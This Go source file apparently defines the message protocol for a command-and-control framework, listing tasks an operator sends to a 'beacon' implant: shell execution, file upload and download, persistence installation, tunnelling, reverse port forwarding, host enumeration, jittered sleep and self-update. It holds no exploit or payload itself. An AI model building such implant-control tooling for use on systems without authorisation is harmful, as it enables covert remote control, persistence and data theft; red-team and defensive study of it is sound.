package protocol

import (
	"encoding/json"
	"fmt"
	"time"
)

// TaskType identifies the command to execute on the beacon.
type TaskType string

const (
	// Execution
	TaskExec     TaskType = "exec"      // Execute a shell command
	TaskExecPty  TaskType = "exec_pty"  // Execute in a PTY
	TaskUpload   TaskType = "upload"    // Upload a file to beacon
	TaskDownload TaskType = "download"  // Download a file from beacon
	TaskLs       TaskType = "ls"        // List directory
	TaskPs       TaskType = "ps"        // List processes

	// Persistence
	TaskInstall TaskType = "install"  // Install persistence mechanism

	// Networking
	TaskTunnelConnect TaskType = "tunnel_connect" // Connect TCP through tunnel
	TaskPortFwd      TaskType = "port_fwd"       // Port forwarding (reverse)
	TaskWhoami     TaskType = "whoami"       // Get identity

	// Information
	TaskInfo     TaskType = "info"       // Get system info
	TaskNetstat  TaskType = "netstat"    // Network connections
	TaskEnv      TaskType = "env"        // Environment variables
	TaskEnumHost TaskType = "enum_host"  // Host enumeration

	// Beacon control
	TaskSleep    TaskType = "sleep"    // Set beacon sleep interval
	TaskExit     TaskType = "exit"     // Terminate beacon
	TaskUpdate   TaskType = "update"   // Update beacon binary

) // end TaskType constants

// Task represents a single C2 task sent to a beacon.
type Task struct {
	ID        string          `json:"id"`
	Type      TaskType        `json:"type"`
	Args      json.RawMessage `json:"args,omitempty"`
	Timeout   int             `json:"timeout,omitempty"` // seconds
	CreatedAt int64           `json:"created_at"`
}

// NewTask creates a new task with the given type and arguments.
func NewTask(taskType TaskType, args interface{}) (*Task, error) {
	var raw json.RawMessage
	if args != nil {
		data, err := json.Marshal(args)
		if err != nil {
			return nil, fmt.Errorf("task: marshal args: %w", err)
		}
		raw = data
	}

	return &Task{
		ID:        generateID(),
		Type:      taskType,
		Args:      raw,
		Timeout:   30,
		CreatedAt: time.Now().UnixMilli(),
	}, nil
}

// TaskResult is the response from a beacon after executing a task.
type TaskResult struct {
	TaskID    string `json:"task_id"`
	Success   bool   `json:"success"`
	Output    string `json:"output,omitempty"`
	Error     string `json:"error,omitempty"`
	ExitCode  int    `json:"exit_code,omitempty"`
	Duration  int64  `json:"duration_ms"`
	Timestamp int64  `json:"ts"`
}

// ExtractArgs deserializes the task arguments into the given type.
func (t *Task) ExtractArgs(v interface{}) error {
	if len(t.Args) == 0 {
		return nil
	}
	return json.Unmarshal(t.Args, v)
}

// --- Typed argument payloads ---

// ExecArgs carries shell command arguments.
type ExecArgs struct {
	Command string   `json:"command"`
	Args    []string `json:"args,omitempty"`
	Shell   string   `json:"shell,omitempty"` // e.g., /bin/bash, powershell.exe
}

// UploadArgs carries file upload arguments.
type UploadArgs struct {
	RemotePath string `json:"remote_path"`
	Data       string `json:"data"` // base64-encoded
	Mode       int    `json:"mode,omitempty"`
}

// DownloadArgs carries file download arguments.
type DownloadArgs struct {
	RemotePath string `json:"remote_path"`
}

// SleepArgs sets the beacon's check-in interval.
type SleepArgs struct {
	Interval int `json:"interval"` // seconds
	Jitter   int `json:"jitter,omitempty"`
}

// LsArgs lists a directory.
type LsArgs struct {
	Path string `json:"path"`
}

// PortFwdArgs sets up port forwarding.
type PortFwdArgs struct {
	LocalPort  int    `json:"local_port"`
	RemoteHost string `json:"remote_host"`
	RemotePort int    `json:"remote_port"`
	Protocol   string `json:"protocol,omitempty"` // tcp, udp
}
